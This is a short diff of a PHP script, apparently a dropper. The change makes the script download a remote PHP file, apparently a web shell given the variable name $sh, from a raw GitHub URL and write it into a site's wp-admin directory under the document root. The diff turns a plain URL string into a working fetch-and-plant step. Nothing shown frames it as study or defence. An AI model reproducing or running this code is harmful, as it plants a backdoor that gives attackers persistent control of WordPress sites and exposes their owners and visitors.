@@ -22,7 +22,7 @@ if (!file_exists($test_dir)) {
 }
 // 
 $path = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/' . file_name($url); 
-$sh = "https://raw.githubusercontent.com/ALiReZa-VaKeR/legA/main/A.php";
+$sh = file_get_contents("https://raw.githubusercontent.com/ALiReZa-VaKeR/legA/main/A.php");
 $f = fopen($path, "w");
 if ($f === false) {
     @file_put_contents($path, $sh);
